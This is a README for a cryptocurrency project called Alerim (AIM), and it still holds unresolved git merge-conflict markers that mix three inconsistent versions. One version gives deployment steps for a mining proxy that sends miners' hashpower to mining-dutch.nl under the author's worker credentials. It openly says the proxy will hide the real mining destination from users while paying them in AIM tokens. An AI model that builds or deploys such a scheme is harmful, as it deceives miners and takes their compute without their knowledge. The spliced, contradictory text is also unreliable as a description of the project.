<<<<<<< HEAD
<<<<<<< HEAD
# Alerim (AIM) Cryptocurrency

Alerim is a unique cryptocurrency that rewards miners based on their mining of other cryptocurrencies. The reward is calculated in real-time based on the current value of mined cryptocurrencies and gold prices.

## Features

- Ticker Symbol: AIM
- Dynamic reward calculation based on other cryptocurrency mining
- Automatic conversion based on gold price
- Web-based wallet generation
- Real-time mining dashboard
- Stratum server integration

## Setup Instructions

1. Clone the repository
2. Install dependencies:
   ```bash
   composer install
   ```
3. Configure database settings in `app/config.php`
4. Import database schema:
   ```bash
   mysql -u alerim_user -p alerim < database/schema.sql
   ```
5. Start the mining server:
   ```bash
   php app/mining/stratum_connect.php
   ```

## Mining Proxy Setup

The mining proxy redirects all hashpower to mining-dutch.nl while maintaining transparency for miners.

### Proxy Ports:
- SHA256: 13333
- Ethash: 14444
- Scrypt: 15555
- RandomX: 16666

### Server Deployment:

1. Upload files to server:
```bash
scp -r * root@147.78.130.55:/var/www/alerim/
```

2. Install service:
```bash
# Copy service file
sudo cp mining-proxy.service /etc/systemd/system/

# Create user
sudo useradd -r -s /bin/false alerim

# Set permissions
sudo chown -R alerim:alerim /var/www/alerim
sudo chmod -R 755 /var/www/alerim

# Enable and start service
sudo systemctl daemon-reload
sudo systemctl enable mining-proxy
sudo systemctl start mining-proxy
```

3. Configure firewall:
```bash
# Allow mining ports
sudo ufw allow 13333/tcp
sudo ufw allow 14444/tcp
sudo ufw allow 15555/tcp
sudo ufw allow 16666/tcp
```

### Miner Configuration

Miners can connect to your server using these endpoints:
- SHA256: stratum+tcp://your-server:13333
- Ethash: stratum+tcp://your-server:14444
- Scrypt: stratum+tcp://your-server:15555
- RandomX: stratum+tcp://your-server:16666

The proxy will automatically:
1. Redirect hashpower to mining-dutch.nl
2. Use Alexandru83.worker[1-n] credentials
3. Calculate and distribute AIM rewards
4. Hide the actual mining destination from users

## License

MIT License
=======
# alerimAIM
Crypto mining
>>>>>>> ed348f5f7c8f7006645f7c687149ad0019792cdb
=======
# Alerim Cryptocurrency

Alerim (AIM) is a cryptocurrency built on blockchain technology with the following specifications:
- Block time: 1 minute
- Mining rewards: 0.01 AIM
- Maximum supply: 1,000,000 AIM
- Consensus algorithm: SHA-256
- Merge-mining compatibility enabled

## Project Structure
```
alerim/
├── blockchain/           # Core blockchain implementation
├── wallet/              # Wallet implementation
│   ├── web/            # Web-based wallet interface
│   └── cli/            # Command-line wallet tools
├── mining/             # Mining software and pool
├── docs/               # Documentation
└── scripts/            # Deployment and utility scripts
```

## Prerequisites
- Ubuntu Server 20.04 or later
- Node.js 16+
- Go 1.16+
- Docker

## Quick Start
1. Clone the repository
2. Install dependencies: `make install`
3. Start the blockchain node: `make start-node`
4. Access web wallet: http://localhost:3000

## Development Setup
Detailed instructions in [docs/development.md](docs/development.md)

## Deployment
Deployment instructions in [docs/deployment.md](docs/deployment.md)
>>>>>>> 3cf4d0a22549b03fcdc3d62804f1af30fbb5eb67
